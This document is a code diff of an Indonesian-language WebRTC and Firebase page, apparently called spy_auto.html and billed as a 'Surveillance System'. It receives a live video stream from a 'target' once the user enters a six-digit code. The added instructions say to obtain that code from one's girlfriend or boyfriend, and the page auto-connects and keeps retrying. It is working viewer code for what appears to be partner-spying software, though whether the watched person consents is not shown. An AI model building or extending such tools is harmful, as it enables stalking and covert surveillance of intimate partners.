@@ -13,58 +13,126 @@
         }
         .container { max-width: 1000px; margin: 0 auto; }
         .header { text-align: center; margin-bottom: 30px; }
-        .title { color: #f0f; font-size: 2.5em; text-shadow: 0 0 10px #f0f; }
+        .title { color: #f0f; font-size: 2em; text-shadow: 0 0 10px #f0f; }
+        
+        .connection-panel {
+            background: #111;
+            padding: 25px;
+            border-radius: 10px;
+            margin-bottom: 20px;
+            border: 1px solid #333;
+        }
+        
+        .input-group {
+            margin: 20px 0;
+            text-align: center;
+        }
+        
+        input {
+            background: #222;
+            color: #0f0;
+            border: 2px solid #444;
+            padding: 15px;
+            width: 100%;
+            max-width: 400px;
+            border-radius: 8px;
+            font-size: 18px;
+            text-align: center;
+            letter-spacing: 3px;
+            font-family: monospace;
+            text-transform: uppercase;
+        }
+        
+        input:focus {
+            outline: none;
+            border-color: #f0f;
+        }
+        
+        .button-group {
+            display: flex;
+            gap: 15px;
+            justify-content: center;
+            margin: 20px 0;
+            flex-wrap: wrap;
+        }
+        
+        button {
+            background: linear-gradient(45deg, #f0f, #0ff);
+            color: black;
+            border: none;
+            padding: 15px 25px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-weight: bold;
+            font-size: 16px;
+            min-width: 200px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+        
+        button:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+        
+        #connectBtn {
+            background: linear-gradient(45deg, #4CAF50, #45a049);
+        }
+        
+        #disconnectBtn {
+            background: linear-gradient(45deg, #f44336, #d32f2f);
+        }
+        
+        .status-display {
+            background: #222;
+            padding: 15px;
+            border-radius: 8px;
+            margin: 20px 0;
+            text-align: center;
+            border-left: 4px solid #f0f;
+            min-height: 60px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .connected {
+            border-left-color: #4CAF50;
+            background: #1a2b1a;
+        }
+        
+        .disconnected {
+            border-left-color: #f44336;
+            background: #2b1a1a;
+        }
+        
         #videoContainer {
             background: #000;
             border-radius: 10px;
             overflow: hidden;
             margin: 20px 0;
             border: 3px solid #f0f;
+            min-height: 400px;
             position: relative;
         }
+        
         #remoteVideo {
             width: 100%;
             display: block;
         }
-        .status-overlay {
+        
+        .video-placeholder {
             position: absolute;
-            top: 10px;
-            left: 10px;
-            background: rgba(0,0,0,0.8);
-            color: #0f0;
-            padding: 10px 15px;
-            border-radius: 5px;
-            font-size: 14px;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            color: #666;
+            text-align: center;
+            font-size: 18px;
         }
-        .control-panel {
-            background: #111;
-            padding: 20px;
-            border-radius: 10px;
-            margin: 20px 0;
-            border: 1px solid #333;
-        }
-        .room-info {
-            background: #222;
-            padding: 15px;
-            border-radius: 5px;
-            margin: 15px 0;
-            border-left: 4px solid #f0f;
-        }
-        button {
-            background: linear-gradient(45deg, #f0f, #0ff);
-            color: black;
-            border: none;
-            padding: 12px 25px;
-            border-radius: 25px;
-            cursor: pointer;
-            font-weight: bold;
-            margin: 10px 5px;
-            font-size: 16px;
-        }
-        button:disabled {
-            opacity: 0.5;
-            cursor: not-allowed;
-        }
+        
         .log {
             background: #111;
             padding: 15px;
@@ -74,10 +142,33 @@
             margin-top: 20px;
             border: 1px solid #333;
         }
+        
         .log-entry {
-            padding: 5px 0;
+            padding: 8px 0;
             border-bottom: 1px solid #222;
-            font-size: 0.9em;
+            font-size: 14px;
+        }
+        
+        .log-time {
+            color: #0ff;
+            font-size: 12px;
+        }
+        
+        .instructions {
+            background: #1a1a2e;
+            padding: 15px;
+            border-radius: 8px;
+            margin: 20px 0;
+            border-left: 4px solid #0ff;
+        }
+        
+        .instructions ol {
+            margin-left: 20px;
+            margin-top: 10px;
+        }
+        
+        .instructions li {
+            margin: 8px 0;
         }
     </style>
 </head>
@@ -88,26 +179,51 @@
             <p>Real-time WebRTC Surveillance System</p>
         </div>
         
+        <div class="instructions">
+            <strong>📋 CARA PAKAI:</strong>
+            <ol>
+                <li>Minta <strong>KODE 6 DIGIT</strong> dari pacarmu</li>
+                <li>Masukkan kode di bawah</li>
+                <li>Klik <strong>CONNECT</strong></li>
+                <li>Tunggu hingga terhubung</li>
+            </ol>
+        </div>
+        
+        <div class="connection-panel">
+            <div class="input-group">
+                <input type="text" 
+                       id="roomInput" 
+                       placeholder="MASUKKAN KODE 6 DIGIT" 
+                       maxlength="6"
+                       oninput="this.value = this.value.toUpperCase().replace(/[^A-Z0-9]/g, '')">
+            </div>
+            
+            <div class="button-group">
+                <button onclick="connectToRoom()" id="connectBtn">
+                    🔗 CONNECT
+                </button>
+                <button onclick="disconnect()" id="disconnectBtn" disabled>
+                    ✖️ DISCONNECT
+                </button>
+            </div>
+            
+            <div class="status-display disconnected" id="statusDisplay">
+                🔴 MENUNGGU KODE ROOM
+            </div>
+        </div>
+        
         <div id="videoContainer">
-            <div class="status-overlay" id="statusOverlay">
-                🔴 MENUNGGU KONEKSI
+            <div class="video-placeholder" id="videoPlaceholder">
+                🎥 Video akan muncul di sini setelah terhubung
             </div>
             <video id="remoteVideo" autoplay playsinline></video>
         </div>
         
-        <div class="control-panel">
-            <div class="room-info" id="roomInfo">
-                <strong>ROOM ID:</strong> <span id="roomIdDisplay">-</span>
-                <br>
-                <strong>STATUS:</strong> <span id="connectionStatus">Disconnected</span>
+        <div class="log" id="log">
+            <div class="log-entry">
+                <span class="log-time">[System]</span> Monitor siap menerima koneksi
             </div>
-            
-            <button onclick="connectToRoom()" id="connectBtn">🔗 CONNECT TO ROOM</button>
-            <button onclick="disconnect()" id="disconnectBtn" disabled>✖️ DISCONNECT</button>
-            <button onclick="copyRoomLink()" id="copyBtn">📋 COPY ROOM LINK</button>
         </div>
-        
-        <div class="log" id="log"></div>
     </div>
 
     <!-- Firebase -->
@@ -134,56 +250,42 @@
         let roomId;
         let answerListener;
         let candidateListener;
-        let statsInterval;
         
-        // ========== GET ROOM ID FROM URL ==========
-        function getRoomIdFromURL() {
-            const urlParams = new URLSearchParams(window.location.search);
-            return urlParams.get('room') || null;
+        // ========== GET ROOM ID FROM INPUT ==========
+        function getRoomId() {
+            return document.getElementById('roomInput').value.trim().toUpperCase();
         }
-        
-        // ========== ON LOAD ==========
-        window.onload = function() {
-            roomId = getRoomIdFromURL();
-            
-            if (roomId) {
-                document.getElementById('roomIdDisplay').textContent = roomId;
-                document.getElementById('statusOverlay').textContent = `🎯 ROOM DETECTED: ${roomId}`;
-                log(`Auto-detected room: ${roomId}`);
-                
-                // Auto-connect after 1 second
-                setTimeout(() => {
-                    connectToRoom();
-                }, 1000);
-            } else {
-                log("❌ No room ID in URL");
-                log("Example URL: spy_auto.html?room=ABC123");
-            }
-        };
         
         // ========== CONNECT TO ROOM ==========
         async function connectToRoom() {
-            if (!roomId) {
-                log("❌ No room ID available!");
+            roomId = getRoomId();
+            
+            if (!roomId || roomId.length !== 6) {
+                log("❌ Masukkan kode 6 digit yang valid!");
                 return;
             }
             
             const connectBtn = document.getElementById('connectBtn');
             const disconnectBtn = document.getElementById('disconnectBtn');
+            const statusDisplay = document.getElementById('statusDisplay');
             
             connectBtn.disabled = true;
             disconnectBtn.disabled = false;
+            connectBtn.innerHTML = "🔄 CONNECTING...";
             
-            log(`🔗 Connecting to room: ${roomId}`);
+            statusDisplay.className = "status-display disconnected";
+            statusDisplay.innerHTML = "🔄 Mencari room...";
+            
+            log(`🔍 Mencari room: ${roomId}`);
             
             try {
                 // Check if room exists
                 const snapshot = await database.ref('rooms/' + roomId).once('value');
-                if (!snapshot.exists()) {
-                    throw new Error("Room tidak ditemukan di server!");
+                if (!snapshot.exists() || !snapshot.val().active) {
+                    throw new Error("Room tidak ditemukan atau tidak aktif!");
                 }
                 
-                log("✅ Room found! Setting up WebRTC...");
+                log("✅ Room ditemukan! Membuat koneksi WebRTC...");
                 
                 // Setup WebRTC
                 await setupWebRTC();
@@ -199,29 +301,34 @@
                 // Clean old offer first
                 await database.ref(`rooms/${roomId}/offer`).remove();
                 
-                // Send offer
+                // Send offer to target
                 await database.ref(`rooms/${roomId}/offer`).set(offer);
-                log("📤 Offer sent to target");
+                log("📤 Offer terkirim ke target");
                 
                 // Setup listeners
                 setupListeners();
                 
                 // Update UI
-                document.getElementById('statusOverlay').textContent = "🟢 CONNECTING...";
-                document.getElementById('connectionStatus').textContent = "Connecting";
+                statusDisplay.className = "status-display disconnected";
+                statusDisplay.innerHTML = "🟡 MENUNGGU RESPONSE TARGET...";
                 
             } catch (error) {
-                log(`❌ Connection failed: ${error.message}`);
-                connectBtn.disabled = false;
-                document.getElementById('statusOverlay').textContent = "🔴 CONNECTION FAILED";
+                log(`❌ Error: ${error.message}`);
                 
-                // Auto-retry in 3 seconds
+                connectBtn.disabled = false;
+                disconnectBtn.disabled = true;
+                connectBtn.innerHTML = "🔗 CONNECT";
+                
+                statusDisplay.className = "status-display disconnected";
+                statusDisplay.innerHTML = `🔴 ${error.message}`;
+                
+                // Auto-retry in 5 seconds
                 setTimeout(() => {
                     if (!peerConnection || peerConnection.connectionState !== 'connected') {
-                        log("🔄 Auto-retrying connection...");
+                        log("🔄 Mencoba kembali...");
                         connectToRoom();
                     }
-                }, 3000);
+                }, 5000);
             }
         }
         
@@ -236,13 +343,19 @@
             
             // Handle incoming stream
             peerConnection.ontrack = (event) => {
-                log("🎥 Video stream received!");
-                const video = document.getElementById('remoteVideo');
-                video.srcObject = event.streams[0];
+                log("🎥 Stream video diterima!");
                 
-                document.getElementById('statusOverlay').textContent = "🔴 LIVE - CONNECTED";
-                document.getElementById('connectionStatus').textContent = "Connected";
-                log("✅ WebRTC connection established!");
+                const video = document.getElementById('remoteVideo');
+                const placeholder = document.getElementById('videoPlaceholder');
+                
+                video.srcObject = event.streams[0];
+                placeholder.style.display = 'none';
+                video.style.display = 'block';
+                
+                document.getElementById('statusDisplay').className = "status-display connected";
+                document.getElementById('statusDisplay').innerHTML = "🟢 LIVE - TERHUBUNG!";
+                
+                log("✅ Koneksi WebRTC berhasil!");
             };
             
             // ICE candidate handler
@@ -255,10 +368,10 @@
             // Connection state
             peerConnection.onconnectionstatechange = () => {
                 const state = peerConnection.connectionState;
-                log(`Connection state: ${state}`);
+                log(`Status koneksi: ${state}`);
                 
                 if (state === 'connected') {
-                    document.getElementById('statusOverlay').textContent = "🔴 LIVE - STREAM ACTIVE";
+                    document.getElementById('statusDisplay').innerHTML = "🔴 LIVE - STREAM AKTIF";
                 } else if (state === 'disconnected' || state === 'failed' || state === 'closed') {
                     handleDisconnection();
                 }
@@ -267,11 +380,11 @@
         
         // ========== SETUP LISTENERS ==========
         function setupListeners() {
-            // Listen for answer
+            // Listen for answer from target
             answerListener = database.ref(`rooms/${roomId}/answer`).on('value', async (snapshot) => {
                 const answer = snapshot.val();
                 if (answer && peerConnection.signalingState === 'have-local-offer') {
-                    log("📥 Answer received from target");
+                    log("📥 Answer diterima dari target");
                     await peerConnection.setRemoteDescription(new RTCSessionDescription(answer));
                 }
             });
@@ -282,7 +395,7 @@
                 if (candidate) {
                     try {
                         await peerConnection.addIceCandidate(new RTCIceCandidate(candidate));
-                        log("✅ ICE candidate added");
+                        log("✅ ICE candidate ditambahkan");
                     } catch (e) {
                         log(`⚠️ ICE error: ${e.message}`);
                     }
@@ -296,50 +409,49 @@
             
             document.getElementById('connectBtn').disabled = false;
             document.getElementById('disconnectBtn').disabled = true;
-            document.getElementById('statusOverlay').textContent = "🔴 DISCONNECTED";
-            document.getElementById('connectionStatus').textContent = "Disconnected";
+            document.getElementById('connectBtn').innerHTML = "🔗 CONNECT";
             
-            log("✖️ Disconnected from room");
+            document.getElementById('statusDisplay').className = "status-display disconnected";
+            document.getElementById('statusDisplay').innerHTML = "🔴 TERPUTUS";
+            
+            const video = document.getElementById('remoteVideo');
+            const placeholder = document.getElementById('videoPlaceholder');
+            
+            video.style.display = 'none';
+            placeholder.style.display = 'block';
+            
+            log("✖️ Koneksi diputus");
         }
         
         // ========== HANDLE DISCONNECTION ==========
         function handleDisconnection() {
-            log("⚠️ Connection lost!");
-            document.getElementById('statusOverlay').textContent = "🔴 RECONNECTING...";
+            log("⚠️ Koneksi terputus!");
+            
+            document.getElementById('statusDisplay').className = "status-display disconnected";
+            document.getElementById('statusDisplay').innerHTML = "🔄 MENCARI ULANG...";
             
             // Auto-reconnect
             setTimeout(() => {
                 if (roomId && (!peerConnection || peerConnection.connectionState !== 'connected')) {
-                    log("🔄 Auto-reconnecting...");
+                    log("🔄 Mencoba reconnect...");
                     connectToRoom();
                 }
-            }, 2000);
-        }
-        
-        // ========== COPY ROOM LINK ==========
-        function copyRoomLink() {
-            const link = `${window.location.origin}${window.location.pathname}?room=${roomId}`;
-            navigator.clipboard.writeText(link).then(() => {
-                log("📋 Room link copied to clipboard!");
-            });
+            }, 3000);
         }
         
         // ========== CLEANUP ==========
         function cleanup() {
-            // Remove listeners
+            // Remove Firebase listeners
             if (answerListener) database.ref(`rooms/${roomId}/answer`).off('value', answerListener);
             if (candidateListener) database.ref(`rooms/${roomId}/targetCandidates`).off('child_added', candidateListener);
             
-            // Clear intervals
-            if (statsInterval) clearInterval(statsInterval);
-            
-            // Close WebRTC
+            // Close WebRTC connection
             if (peerConnection) {
                 peerConnection.close();
                 peerConnection = null;
             }
             
-            // Clear video
+            // Clear video stream
             const video = document.getElementById('remoteVideo');
             if (video.srcObject) {
                 video.srcObject.getTracks().forEach(track => track.stop());
@@ -352,12 +464,49 @@
             const logDiv = document.getElementById('log');
             const entry = document.createElement('div');
             entry.className = "log-entry";
-            entry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
+            
+            const time = new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit', second:'2-digit'});
+            entry.innerHTML = `<span class="log-time">[${time}]</span> ${message}`;
+            
             logDiv.appendChild(entry);
             logDiv.scrollTop = logDiv.scrollHeight;
         }
         
-        // Auto-cleanup
+        // ========== AUTO-CONNECT FROM URL ==========
+        function checkURLForRoom() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const roomFromURL = urlParams.get('room');
+            
+            if (roomFromURL && roomFromURL.length === 6) {
+                document.getElementById('roomInput').value = roomFromURL.toUpperCase();
+                log(`📥 Room ID dari URL: ${roomFromURL}`);
+                
+                // Auto-connect after 1 second
+                setTimeout(() => {
+                    connectToRoom();
+                }, 1000);
+            }
+        }
+        
+        // ========== INITIALIZATION ==========
+        window.onload = function() {
+            log("🟢 Sistem monitor siap");
+            
+            // Check for room ID in URL
+            checkURLForRoom();
+            
+            // Auto-focus input
+            document.getElementById('roomInput').focus();
+            
+            // Enable Enter key to connect
+            document.getElementById('roomInput').addEventListener('keypress', function(e) {
+                if (e.key === 'Enter') {
+                    connectToRoom();
+                }
+            });
+        };
+        
+        // Cleanup on page unload
         window.addEventListener('beforeunload', cleanup);
         window.addEventListener('pagehide', cleanup);
     </script>
